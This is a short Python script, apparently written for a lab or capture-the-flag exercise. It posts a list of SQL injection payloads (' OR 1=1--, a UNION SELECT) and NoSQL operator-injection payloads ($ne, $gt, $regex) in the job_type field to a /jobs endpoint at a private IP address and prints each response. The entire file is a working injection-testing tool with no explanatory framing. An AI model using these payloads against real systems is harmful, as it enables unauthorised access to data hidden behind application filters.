import requests
import json

def main():
    url = "http://10.0.162.112:80/jobs"
    headers = {
        "Content-Type": "application/json"
    }
    
    payloads = [
        {"job_type": "private' OR 1=1--"},
        {"job_type": "private' OR '1'='1"},
        {"job_type": "' OR 1=1--"},
        {"job_type": "private' UNION SELECT 1,2,3,4--"},
        {"job_type": {"$ne": "front-end"}},
        {"job_type": {"$gt": ""}},
        {"job_type": {"$ne": "back-end"}},
        {"job_type": {"$regex": ".*"}},
        {"job_type": "private' OR '1'='1'--"},
        {"job_type": "' OR 1=1"}
    ]
    
    session = requests.Session()
    
    for i, payload in enumerate(payloads, 1):
        print(f"=== Request {i} ===")
        print(f"Payload: {json.dumps(payload)}")
        try:
            response = session.post(url, json=payload, headers=headers)
            print(f"Status Code: {response.status_code}")
            print(f"Response Body:\n{response.text}\n")
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}\n")

if __name__ == "__main__":
    main()